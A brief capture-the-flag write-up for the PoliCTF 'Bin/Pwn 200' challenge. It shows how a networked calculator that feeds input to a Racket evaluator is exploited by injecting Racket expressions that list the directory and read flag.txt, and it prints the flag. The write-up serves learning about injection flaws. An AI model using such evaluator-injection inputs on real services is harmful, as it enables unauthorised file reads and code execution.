# PoliCTF Bin/Pwn 200

Bin 200 exposes a calculator application running on some port.

    mah@mah-MacBookAir ~ % nc -p 9003 calc.challenges.polictf.it 4000
    Write the first number:5
    Write the operator:*
    Write the second number:5
    25

The calculator concatenates \[Operator Text] \[First Number Text] \[Second Number
Text] and runs a polish notation calculation on the text. The polish
notation calculation is actually a racket evaluator. I imagine source
logic sort of like:

    echo "( $OPERATOR_TEXT $FIRST_NUMBER_TEXT $SECOND_NUMBER_TEXT )" | racket

Racket was determined by a few things. First consider Polish notation
languages. The calculator handled fraction math and responded to scheme
boolean functions with #t and #f. Racket from Scheme was distinguished
creating an if statement with no else.

    Write the first number:if #t 1
    Write the operator:
    Write the second number:

This stalls and fails, so it is racket.

We can then find and expose the flag

    Write the first number:foldr (lambda (x y) (string-append x " " y)) "" (map (lambda (x) (path->string x)) (directory-list (current-directory)))
    Write the operator:
    Write the second number:
    flag.txt challenge

    Write the first number:read-line (open-input-file "flag.txt")
    Write the operator:
    Write the second number:
    cb1228e2387cc12ad30fd4243fc23a0

Interestingly, functions file->string and system don't work.
